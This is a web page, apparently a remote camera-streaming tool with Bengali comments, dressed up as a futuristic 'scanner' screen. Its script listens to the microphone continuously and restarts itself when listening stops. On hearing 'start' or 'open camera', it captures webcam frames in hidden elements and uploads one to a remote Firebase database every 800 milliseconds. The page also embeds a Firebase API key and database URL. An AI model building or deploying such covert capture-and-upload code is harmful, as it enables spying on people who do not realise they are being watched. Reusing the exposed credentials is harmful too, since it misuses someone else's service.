<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Binno Core - User</title>
    <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-database-compat.js"></script>
    <style>
        body { margin: 0; background: #000; color: #38bdf8; font-family: 'Orbitron', sans-serif; height: 100vh; display: flex; align-items: center; justify-content: center; overflow: hidden; }
        .scanner { position: relative; width: 250px; height: 250px; border: 2px solid #1e293b; border-radius: 50%; display: flex; align-items: center; justify-content: center; }
        .ring { position: absolute; width: 100%; height: 100%; border: 2px solid transparent; border-top: 3px solid #38bdf8; border-radius: 50%; animation: rotate 3s linear infinite; }
        .inner-dot { width: 15px; height: 15px; background: #38bdf8; border-radius: 50%; box-shadow: 0 0 20px #38bdf8; animation: pulse 1.5s infinite; }
        @keyframes rotate { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
        @keyframes pulse { 0%, 100% { opacity: 0.5; transform: scale(1); } 50% { opacity: 1; transform: scale(1.2); } }
        .hud { position: absolute; bottom: 50px; text-align: center; width: 100%; }
        .id-text { font-size: 20px; font-weight: bold; letter-spacing: 2px; margin-bottom: 10px; }
        .status-text { font-size: 12px; color: #94a3b8; text-transform: uppercase; }
        video, canvas { display: none; }
    </style>
</head>
<body>

    <div class="scanner">
        <div class="ring"></div>
        <div class="inner-dot"></div>
    </div>

    <div class="hud">
        <div class="id-text" id="displayId">ID: INITIALIZING...</div>
        <div class="status-text" id="msg">Voice: OFF</div>
    </div>

    <video id="video" autoplay playsinline muted></video>
    <canvas id="canvas"></canvas>

    <script>
        // ⚠️ আপনার Firebase Config এখানে দিন
        const firebaseConfig = {
            apiKey: "AIzaSyCjkTs-41gSVeQQgDKWE6fSWvj1POgHHpc",
            authDomain: "ollo-ff1f3.firebaseapp.com",
            databaseURL: "https://ollo-ff1f3-default-rtdb.asia-southeast1.firebasedatabase.app",
            projectId: "ollo-ff1f3"
        };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();

        // Unique ID Generation
        const userId = "ID-" + Math.random().toString(36).substr(2, 5).toUpperCase();
        document.getElementById('displayId').innerText = "ID: " + userId;

        // Register User
        db.ref(`users/${userId}`).set({ isActive: true, status: "Online" });

        // ১. উন্নত ভয়েস কমান্ড লজিক
        function initVoice() {
            const Speech = window.SpeechRecognition || window.webkitSpeechRecognition;
            if (!Speech) {
                document.getElementById('msg').innerText = "Voice Not Supported";
                return;
            }

            const rec = new Speech();
            rec.continuous = true;
            rec.lang = 'en-US';

            rec.onstart = () => { document.getElementById('msg').innerText = "Voice: LISTENING..."; };
            rec.onresult = (e) => {
                const cmd = e.results[e.results.length - 1][0].transcript.toLowerCase();
                console.log("Heard:", cmd);
                if (cmd.includes("open camera") || cmd.includes("start")) {
                    startStreaming();
                }
            };

            // অটো-রিস্টার্ট লজিক (যাতে কমান্ড শোনা বন্ধ না হয়)
            rec.onend = () => rec.start();
            rec.start();
        }

        // ২. Base64 ইমেজ স্ট্রিমিং
        async function startStreaming() {
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            const ctx = canvas.getContext('2d');

            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                video.srcObject = stream;
                document.getElementById('msg').innerText = "Camera: UPLOADING";

                setInterval(() => {
                    canvas.width = 320;
                    canvas.height = 240;
                    ctx.drawImage(video, 0, 0, 320, 240);
                    const base64Img = canvas.toDataURL('image/jpeg', 0.4);
                    
                    db.ref(`liveStream/${userId}`).set({
                        image: base64Img,
                        lastUpdate: Date.now()
                    });
                }, 800); // প্রতি ৮০০ মিলি-সেকেন্ডে ছবি পাঠাবে

            } catch (err) {
                alert("Camera Access Required!");
            }
        }

        initVoice();
    </script>
</body>
</html>
